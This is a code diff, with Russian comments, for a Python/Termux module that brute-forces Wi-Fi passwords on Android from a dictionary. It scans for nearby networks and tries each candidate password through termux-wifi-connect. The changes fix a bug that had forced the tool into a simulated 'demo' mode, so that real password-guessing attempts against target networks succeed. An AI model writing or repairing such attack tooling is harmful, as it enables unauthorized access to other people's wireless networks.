@@ -60,22 +60,52 @@ def dict_path(fname):
 
 def _get_targets():
     """Возвращает список доступных Wi-Fi сетей через Termux:API:
-    [(ssid, secure), ...]."""
+    [(ssid, secure), ...].
+
+    termux-wifi-scaninfo отдаёт только ПОСЛЕДНИЕ результаты скана; если они
+    устарели/пусты, сначала запускается активный скан `termux-wifi-scan`
+    (он занимает несколько секунд и обновляет данные для scaninfo).
+    """
     import json
     import subprocess
 
     exe = api_bin("termux-wifi-scaninfo")
     if exe is None:
         return []
-    try:
-        out = subprocess.run([exe],
-                             capture_output=True, text=True,
-                             timeout=15).stdout
-        data = json.loads(out or "[]")
-    except Exception:
-        return []
-    if isinstance(data, dict):
-        data = [data]
+
+    def _read():
+        try:
+            out = subprocess.run([exe], capture_output=True, text=True,
+                                 timeout=15).stdout
+            data = json.loads(out or "[]")
+        except Exception:
+            return []
+        if isinstance(data, dict):
+            data = [data]
+        return data if isinstance(data, list) else []
+
+    data = _read()
+    fresh = False
+    now_ms = int(time.time() * 1000)
+    for net in data:                          # свежие записи — не старше 2 мин
+        ts = net.get("timestamp") if isinstance(net, dict) else None
+        try:
+            if ts and abs(now_ms - int(ts)) < 120_000:
+                fresh = True
+                break
+        except Exception:
+            pass
+    if not data or not fresh:
+        scanner = api_bin("termux-wifi-scan")
+        if scanner:
+            print(f"{C.DIM}  Запуск активного Wi-Fi скана через Termux:API…{C.RESET}")
+            try:
+                subprocess.run([scanner], capture_output=True, text=True,
+                               timeout=30, stdin=subprocess.DEVNULL)
+            except Exception:
+                pass
+            data = _read()
+
     targets, seen = [], set()
     for net in data:
         if not isinstance(net, dict):
@@ -162,35 +192,48 @@ def _termux_connectable():
 
 def _try_connect(ssid, pwd):
     """Одна реальная попытка подключения к сети с паролем pwd
-    через `termux-wifi-connect` (Termux:API)."""
-    import json
-    import subprocess
+    через `termux-wifi-connect` (Termux:API).
 
+    ВАЖНО (исправление ложного демо-режима): у termux-wifi-connect НЕТ
+    параметра --type; он принимает только --ssid и --pwd. Прежний вызов
+    с "--type wpa2" падал с ошибкой аргументов, поэтому каждая проверка
+    возвращала False и модуль объявлял сеть «недоступной» / уходил в демо.
+    Тип защиты (wpa/wep/открытая) Android определяет сам по сохранённому
+    профилю сети. Результат читается из stdout команды:
+      "Connected to \"SSID\"" — пароль подошёл;
+      "Error: wrong password" — неверный пароль;
+      "Error: ..." прочее — сеть сейчас недоступна.
+    Открытые сети (без пароля) тоже проверяются корректно: пустой --pwd
+    передавать нельзя, поэтому используется тернарный аргумент.
+    """
     exe = api_bin("termux-wifi-connect")
     if exe is None:
-        return False
+        return None            # Termux:API нет — решение о режиме принимает caller
+    import subprocess
+
+    cmd = [exe, "--ssid", ssid] + (["--pwd", pwd] if pwd else [])
+    out = ""
     try:
-        subprocess.run([exe, "--ssid", ssid,
-                        "--pwd", pwd, "--type", "wpa2"],
-                       stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
-                       text=True, timeout=15)
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15,
+                           stdin=subprocess.DEVNULL)
+        out = ((r.stdout or "") + (r.stderr or "")).lower()
     except Exception:
         return False
-    ok = False
+    if "connected" in out:
+        return True
+    if "wrong password" in out or "password" in out:
+        return False
+    # неясный ответ — сверимся с фактическим подключением
     info_exe = api_bin("termux-wifi-info")
-    steps = max(1, int(round(DELAY * 10)))
-    for _ in range(steps):        # короткое ожидание статуса
-        time.sleep(0.1)
+    if info_exe:
+        import json
         try:
-            out = subprocess.run([info_exe],
-                                 capture_output=True, text=True,
-                                 timeout=5).stdout
-            info = json.loads(out or "{}")
+            j = json.loads(subprocess.run([info_exe], capture_output=True,
+                                          text=True, timeout=5).stdout or "{}")
+            if j.get("connected") and j.get("ssid") == ssid:
+                return True
         except Exception:
-            info = {}
-        if info.get("connected") and info.get("ssid") == ssid:
-            ok = True
-            break
+            pass
     forget = api_bin("termux-wifi-forgetprofile")
     if forget:
         try:                      # откат профиля, чтобы не остаться в сети
@@ -199,7 +242,7 @@ def _try_connect(ssid, pwd):
                            text=True, timeout=10)
         except Exception:
             pass
-    return ok
+    return False
 
 
 def _save_result(ssid, pwd, demo_note=False):
@@ -280,8 +323,15 @@ def run_attack(ssid, dict_path, demo=False):
                 break
             ok = False
             if real_mode:
-                ok = _try_connect(ssid, pwd)
-            else:
+                r = _try_connect(ssid, pwd)
+                if r is None:              # Termux:API пропал в процессе
+                    real_mode = False
+                    demo = True
+                    print(f"\n{C.YELLOW}  [!] Termux:API недоступен — включён "
+                          f"демо-режим.{C.RESET}")
+                else:
+                    ok = bool(r)
+            if not real_mode:
                 # демо: имитируем проверку с шагом 0.1 сек
                 if stop.wait(DELAY):
                     stopped_by_user = True
